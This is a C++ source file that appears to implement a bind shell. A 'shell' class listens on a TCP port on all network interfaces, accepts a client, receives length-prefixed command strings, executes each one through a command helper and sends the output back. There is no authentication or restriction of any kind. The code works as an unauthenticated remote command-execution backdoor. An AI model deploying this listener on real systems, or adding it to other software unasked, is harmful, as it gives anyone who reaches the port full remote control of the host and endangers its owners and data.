#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include "shell.hpp"
#include "command.hpp"

void shell::start() {
    sockaddr_in addr;
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(this->port);
    addr.sin_addr.s_addr = INADDR_ANY;

    //AF_INET: Defining the use of the IP protocol
    //SOCK_STREAM: Defining the use a TCP stream
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);

    if (bind(serverSocket, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind failed");
        close(serverSocket);
        return;
    }

    listen(serverSocket, 5);

    this->acceptClientConnection(serverSocket);
}

void shell::acceptClientConnection(int serverSocket) {
    int clientSocket = accept(serverSocket, nullptr, nullptr);
    
    while (clientSocket > 0) {
        uint32_t cmd_len = 0;
        if (recv(clientSocket, &cmd_len, sizeof(cmd_len), MSG_WAITALL) <= 0) break;
        cmd_len = ntohl(cmd_len);

        std::string cmd(cmd_len, '\0');
        if (recv(clientSocket, cmd.data(), cmd_len, MSG_WAITALL) <= 0) break;

        std::string output = command::execute_command(cmd.c_str());

        uint32_t resp_len = htonl(output.size());
        send(clientSocket, &resp_len, sizeof(resp_len), 0);
        send(clientSocket, output.data(), output.size(), 0);
    }
    close(clientSocket);
}